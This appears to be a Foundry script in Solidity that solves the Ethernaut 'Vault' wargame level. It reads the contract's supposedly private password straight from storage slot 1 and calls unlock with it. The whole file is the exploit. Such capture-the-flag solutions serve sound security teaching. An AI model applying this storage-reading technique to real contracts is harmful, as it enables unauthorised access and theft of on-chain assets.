// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";
import {Vault} from "../../src/Ethernaut/Vault.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Vault vault = Vault(0x3Aa7fb89a093B2e0EbF9a80aFEA96af772689014);
        bytes32 password = vm.load(
            0x3Aa7fb89a093B2e0EbF9a80aFEA96af772689014,
            bytes32(uint256(1))
        );
        vault.unlock(password);
        vm.stopBroadcast();
    }
}
